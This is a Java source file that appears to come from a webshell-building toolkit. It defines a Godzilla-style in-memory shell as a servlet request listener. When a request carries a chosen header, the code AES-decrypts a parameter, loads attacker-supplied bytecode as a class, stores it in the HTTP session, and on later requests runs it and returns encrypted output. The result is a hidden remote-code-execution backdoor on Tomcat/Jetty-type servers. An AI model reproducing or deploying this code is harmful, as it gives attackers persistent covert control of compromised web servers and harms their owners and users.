package com.reajason.javaweb.examples.customgui.shelltool;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.io.PrintWriter;

/**
 * Listener 版模板，协议与内置 GodzillaListener 一致，payload（core）改存 {@link HttpSession}。
 *
 * <p>{@code getResponseFromRequest} 的方法体是占位实现：生成期由
 * {@code ListenerBuilderModifier} 按目标 server 自动适配（Tomcat/Jetty/... 各自从请求对象里
 * 取 response 的方式不同），所以模板里保持返回 null 即可。
 *
 * @author ReaJason
 */
public class GodzillaSessionListener extends ClassLoader implements ServletRequestListener {
    private static String key;
    private static String pass;
    private static String md5;
    private static String headerName;
    private static String headerValue;
    private static String sessionKey;

    public GodzillaSessionListener() {
    }

    public GodzillaSessionListener(ClassLoader z) {
        super(z);
    }

    @Override
    @SuppressWarnings("all")
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();
        try {
            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
                HttpServletResponse response = (HttpServletResponse) getResponseFromRequest(request);
                PrintWriter writer = response.getWriter();
                try {
                    byte[] data = base64Decode(request.getParameter(pass));
                    data = this.x(data, false);
                    HttpSession session = request.getSession();
                    Class<?> payload = (Class<?>) session.getAttribute(sessionKey);
                    if (payload == null) {
                        // 本会话第一次请求：用本次请求携带的字节定义 core，并存进会话
                        session.setAttribute(sessionKey,
                                new GodzillaSessionListener(Thread.currentThread().getContextClassLoader())
                                        .defineClass(data, 0, data.length));
                    } else {
                        ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                        Object f = payload.newInstance();
                        f.equals(arrOut);
                        f.equals(request);
                        f.equals(data);
                        f.toString();
                        writer.write(md5.substring(0, 16));
                        writer.write(base64Encode(this.x(arrOut.toByteArray(), true)));
                        writer.write(md5.substring(16));
                        writer.flush();
                        writer.close();
                    }
                } catch (Throwable e) {
                    e.printStackTrace();
                    writer.write(getErrorMessage(e));
                }
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    private Object getResponseFromRequest(Object request) throws Exception {
        return null;
    }

    @SuppressWarnings("all")
    public static String base64Encode(byte[] bs) throws Exception {
        try {
            Object encoder = Class.forName("java.util.Base64").getMethod("getEncoder").invoke(null);
            return (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var6) {
            Object encoder = Class.forName("sun.misc.BASE64Encoder").newInstance();
            return (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
        }
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }

    public byte[] x(byte[] s, boolean m) throws Exception {
        Cipher c = Cipher.getInstance("AES");
        c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
        return c.doFinal(s);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }

    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
    }
}
